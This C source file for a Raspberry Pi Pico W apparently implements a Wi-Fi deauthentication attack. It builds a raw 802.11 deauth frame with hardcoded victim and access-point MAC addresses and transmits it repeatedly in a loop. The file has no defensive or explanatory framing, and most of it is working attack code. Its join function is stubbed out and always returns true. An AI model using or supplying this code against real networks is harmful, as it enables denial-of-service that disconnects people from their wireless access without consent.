#include <stdio.h>
#include "pico/stdlib.h"
#include "deauth.h"

#include "picowi_defs.h"
#include "picowi_pico.h"
#include "picowi_wifi.h"
#include "picowi_ioctl.h"
#include "picowi_event.h"
#include "picowi_join.h"
#include "picowi_ip.h"
#include "picowi_dhcp.h"
#include "picowi_net.h"
#include "picowi_tcp.h"
#include "picowi_web.h"
#include "picowi_init.h"

bool joinAP(char *ssid, char *password)
{
    // int linkStatus = cyw43_wifi_link_status(&cyw43_state, CYW43_ITF_STA);
    // printf("Current link status: %d\n", linkStatus);
    // if (linkStatus != CYW43_LINK_JOIN)
    // {
    //     printf("Attempting to join wifi...\n");
    //     printf("SSID: %s\n", ssid);
    //     if (cyw43_arch_wifi_connect_timeout_ms(ssid, password, CYW43_AUTH_WPA2_AES_PSK, 10000))
    //     {
    //         printf("Failed to joined network.\n");
    //         return false;
    //     }
    //     else
    //     {
    //         printf("Succesfully joined network.\n");
    //         return true;
    //     }
    // }
    // else
    // {
    //     return true;
    // }
    return true;
}

void deauth()
{
    int count = 0;
    int dErr = 0;
    uint8_t deauthPacket[26] = {
        /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
        /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
        /*  4 - 9  */ 0xEA, 0x28, 0x58, 0x73, 0x22, 0xC3, // reciever (target) 0xEA, 0x28, 0x58, 0x73, 0x22, 0xC3
        /* 10 - 15 */ 0xA2, 0x22, 0x27, 0x05, 0xFE, 0xBE, // source (ap)0xEA, 0x17, 0x93, 0xC2, 0x8D, 0x3C
        /* 16 - 21 */ 0xA2, 0x22, 0x27, 0x05, 0xFE, 0xBE, // BSSID (ap)0xA2, 0x22, 0x27, 0x05, 0xFE, 0xBE
        /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
        /* 24 - 25 */ 0x07, 0x00                         // reason code (1 = unspecified reason)
    };

    printf("Sending death...\n");
    for (; count < 32;)
    {
        sleep_ms(500);
        dErr = event_net_tx((void *) deauthPacket, 26);
        if (dErr)
            count++;
    }
    printf("Result: %d , %d frames sent.\n", dErr, count);
}
